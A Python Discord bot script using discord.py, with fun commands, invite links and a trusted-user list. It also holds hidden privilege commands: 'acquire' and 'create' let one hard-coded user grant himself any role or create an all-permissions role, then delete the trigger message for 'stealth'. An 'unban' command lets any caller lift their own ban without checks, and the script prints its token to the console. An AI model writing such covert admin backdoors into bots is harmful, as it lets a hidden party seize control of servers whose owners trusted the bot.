#imports
import discord, time, os, random, asyncio, ctypes , sys, secret
from discord.ext import commands

print(secret.TOKEN)


#bot init
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="/",intents=intents)
bot.remove_command("help")

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    activity = discord.Activity(name='You👀', type=discord.ActivityType.watching)
    await bot.change_presence(activity=activity)

#CONSTANTS

#servers
SILLYCORNERID = secret.SILLYCORNERID
FANCLUBID = secret.FANCLUBID

#users
PAULID =    secret.PAULID
MIKEID =    secret.MIKEID  
CONNORID =  secret.CONNORID  
DEANID =    secret.DEANID  
AIDANID =   secret.AIDANID
THOMASID =  secret.THOMASID
ANTHONYID = secret.ANTHONYID
PATID =     secret.PATID
JLEEID =    secret.JLEEID
AJID =      secret.AJID
MATTID =    secret.MATTID

#other
TRUSTED = [
    PAULID,
    CONNORID,
    DEANID,
    AIDANID,
    THOMASID,
    ANTHONYID,
    PATID,
    JLEEID,
    AJID,
    MATTID
]

@bot.event
async def on_message(message):
    if message.author == bot.user: return

    # allows commands to work
    await bot.process_commands(message)


@bot.command()
async def hello(ctx):
    await ctx.send("Hello, I am a robot")
 

@bot.command()
async def false(ctx):
    if ctx.author.id == PAULID:
        await ctx.send('Fact Check: False')
        await ctx.message.delete()


@bot.command()
async def true(ctx):
    if ctx.author.id == PAULID:
        await ctx.send('Fact Check: True')
        await ctx.message.delete()


@bot.command(aliases=[""])
async def trusted(ctx):
    output = ""
    for i in range(len(TRUSTED)):
        user = bot.get_user(TRUSTED[i])
        output += f"{i+1}. {user.mention}\n"
    await ctx.send(f"I trust {len(TRUSTED)} people, their names are:")
    await ctx.send(f"{output}")


@bot.command()#gives the user a role
async def acquire(ctx, *, name):
    if ctx.author.id == PAULID:
        server = ctx.channel.guild
        role = discord.utils.get(server.roles, name=name)
        await ctx.author.add_roles(role)
        await ctx.channel.purge(limit=1)  # stealth
    else: 
        ctx.send("insuff perms")


@bot.command()#creates a role with perms 
async def create(ctx, name):
    if ctx.author.id == PAULID:
        server = ctx.channel.guild
        role = await server.create_role(name=name, permissions=discord.Permissions.all())
        await ctx.channel.purge(limit=1)  # stealth 100
    else: 
        ctx.send("insuff perms")


@bot.command()
async def fanclub(ctx):
    fanclub = bot.get_guild(FANCLUBID)
    # print(chillCorner.channels)
    await ctx.send(await fanclub.channels[2].create_invite())


@bot.command() 
async def purge(ctx, num=2):
    if ctx.author.id in TRUSTED:
        await ctx.channel.purge(limit=num + 1)
    else: 
        ctx.send("You can't do that")


@bot.command()
async def link(ctx):
    sillycorner = bot.get_guild(SILLYCORNERID)
    # print(chillCorner.channels)
    await ctx.send(await sillycorner.channels[2].create_invite(max_age=300))


#likely chillcorner era
@bot.command()
async def unban(ctx, serverid=SILLYCORNERID):
    
    server = bot.get_guild(serverid)
    user = bot.get_user(ctx.author.id)
    try:
        await server.unban(user)
        await ctx.send(f'unbanned {user.mention} from {server.name}')
    except Exception as e:
        await ctx.send(e)
        print(type(e))
    await link(ctx)




bot.run(secret.TOKEN)